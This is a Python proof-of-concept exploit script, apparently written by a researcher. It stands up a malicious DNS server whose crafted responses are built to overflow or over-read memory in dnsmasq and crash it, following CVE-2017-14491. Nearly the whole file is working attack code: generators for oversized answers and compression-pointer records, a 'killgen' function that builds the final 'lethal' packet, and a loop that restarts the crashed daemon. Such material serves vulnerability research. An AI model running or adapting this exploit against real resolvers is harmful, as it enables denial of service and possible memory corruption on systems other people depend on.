import socket 
import sys
import binascii
import os
import subprocess
import time

# Samuel Lovejoy - 2019 
# lovejoy.sam@gmail.com
# Aerospace Corporation
# I made art :) 

'''This is a demo that functionally works as a proof of concept. Parts of the code are 
unnecessary as they serve only to fill the DNS packet with garbage answers. This demo
demonstrates how dnsmasq can have bad reads when DNS answers are truncated in the wrong
location, causing a read over the buffer potentially leading to a segmentation fault. 
This vulnerability is heavily based off of Google Security Team's vulnerability 
CVE-2017-14491 discovered in late 2017.'''


'''This demo starts a malicious DNS server as well as dnsmasq. If dnsmasq crashes, this 
script will attempt to restart it. For each query, the script will output the "tail" --
the truncated bytes of the dns packet. Use htop to kill dnsmasq if the port is busy.'''

def answergen(size): 
    # This function generates a normal sized answer to appended to our packet
    header = "c00c" + "000c" + "0001" + "0000003d"
    psize = str(hex(size))[2:]
    while(len(psize) != 4): # Total size of our packet
        psize = "0" + psize
    header += psize
    mychar = str(hex(65 + (size % 7)))[2:] # Character we will put in for inverse lookup
    mlen = str(hex(size - 10))[2:]
    data = '03' + mychar + mychar + mychar # three characters, e.g. www.--
    if (len(mlen) != 2):
        mlen = "0" + mlen
    data += mlen 
    mychar = str(hex(66 + (size % 7)))[2:]
    for i in range(size - 10): # The rest of the charcaters e.g. www.xxxxxxxxxxxxxxx.--
        data +=  mychar
    mychar = str(hex(67 + (size % 7)))[2:]
    data += '03' + mychar + mychar + mychar  + "00" # finish the data, www.xxxxxxxxxx.yyy
    packet = header + data
    return packet


def biggen(size): 
    # This function is for generating very large size packets
    header = "c00c" + "000c" + "0001" + "0000003d" # The header is normal
    psize = str(hex(size))[2:]
    while(len(psize) != 4): # Grab the size and make sure it is the right length
        psize = "0" + psize
    header += psize
    tmp = size
    data = header
    while(tmp > 63): # Separate everything by 64 bytes, data sections larger than 64 bytes are not in RFC1035
        data += '3e' # Size of the data section
        for _ in range(62): # Fill the data section
            data += "69" 
        tmp = tmp - 63 
    finlen = str(hex(tmp -2))[2:] # Account for the remainder
    if(len(finlen) != 2):
        finlen = "0" + finlen
    data += finlen
    for _ in range(tmp - 2):
        data += '70'
    data += '00' # End the qname section
    return data

def check_dnsmasq():
    # Check to see if dnsmasq is running on port 53535
    tempsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = tempsock.connect_ex(('127.0.0.1', 53535))
    tempsock.close() 
    if result == 0: # The socket could be opened, meaning dnsmasq has crashed
        return False
    else: # The socket could not be opened, meaning dnsmasq is alive
        return True
    

def handler(sox, ndx): 
    data, addr = sox.recvfrom(1024) # wait for a query
    print("Data received at DNS Server")
    packet = packetgen(binascii.hexlify(data), ndx) 
    printpacket(packet) 
    sox.sendto(binascii.unhexlify(packet), addr) # send it back
    return


def killgen(ptrpacket, start): 
    # Create the lethal packets that takes control of dnsmasq
    kill = ptrpacket[:22] # Use a pointer packet for reference
    kill = kill + "07" # Look like a normal packet
    kill = kill + "026f68" + "03626f79"
    return kill
    target = str(hex((start + 32)/2))[2:]
    while(len(target) != 4): # Put the pointer to something much bigger
        target = "0" + target
    kill += "c" + target[1:] 
    return kill


def main(): 
    ip = sys.argv[1] 
    # Create a socket at listen at the default DNS port 53
    sox = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sox.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    sox.bind((ip, 53))
    print("Listening at " + ip) 
    start_dnsmasq()
    ndx = 0  
    while True: 
        # wait patiently
        handler(sox, ndx)
        ndx = ndx + 1
        time.sleep(1)
        if(check_dnsmasq()): # Dnsmasq has crashed and must be regoosed
            start_dnsmasq()
    sox.close() 


def packetgen(data,ndx): 
    # Generate the overall packet to be sent to dnsmasq
    header_id = data[:4] #  Grab the header id from the packet dnsmasq sent over
    flags = "85a0" + "0001" + "00d4" + "0000" + "0000"  #  Match the proper flags, question-answers-servers-additional
    qlen = data[24:26]
    start = 24 
    end = 26 
    nex = 0 
    question = ''
    # Grab the whole question, we know the qname section ends when we hit the null byte '00'
    while(data[start:end] != '00'):
        nex = int(data[start:end], 16)
        question += data[start:end+nex*2]
        start = end+nex*2
        end = start + 2
    question += "00000c0001" # These will always be the flags sent over by dnsutils, ##HARDCODED
    packet = header_id + flags + question 
    ans = biggen(1024) # Big gen makes a very large packet
    packet += ans
    mylen = len(packet)
    answer = answergen(79+ndx) # Answer gen makes a normal size packet
    packet += answer
    ptr = ptrgen(answer, packet) # Make a packet that points to the second answer
    for ndx in range(207): 
         packet += ptr # Make 207 of them
    packet += ptr
    kill = killgen(ptr, mylen) # Make the final 'killer' packet point towards the second packet, causing the overflow
    packet += kill
    return packet

def printpacket(packet):
    # print the truncated bytes in a nice way
    tail = packet[8192:] 
    octets = [tail[i:i+2] for i in range(0, len(tail), 2)]
    pairs = [" ".join(octets[i:i+2]) for i in range(0, len(octets), 2)]
    outtail = "\n".join(pairs)
    print("Tail:\n" + outtail)
    return



def ptrgen(answer,packet): 
    #Generate a packet that points to another resource
    header = "c00c" + "000c" + "0001" + "0000003d" + "0002" #  Size is always two, the address of the resource
    ndx = packet.find(answer) + 24 #  Find the resource, then offset the size of the resource header
    target = str(hex(ndx/2))[2:]
    while(len(target) != 4):  #  Make sure the target address is always 4 bytes in length
        target = "0" + target
    target = "c" + target[1:]
    response = header + target  #  Form the packet 
    return response

def start_dnsmasq(): 
    # Start dnsmasq
    home = os.getcwd()
    os.chdir("/test/dnsmasq/src")
    subprocess.call("./dnsmasq -p 53535 --no-daemon --log-queries -S " + sys.argv[1] + " --no-hosts --no-resolv &", shell=True)
    os.chdir(home)
    return

if __name__ == '__main__':
    main()
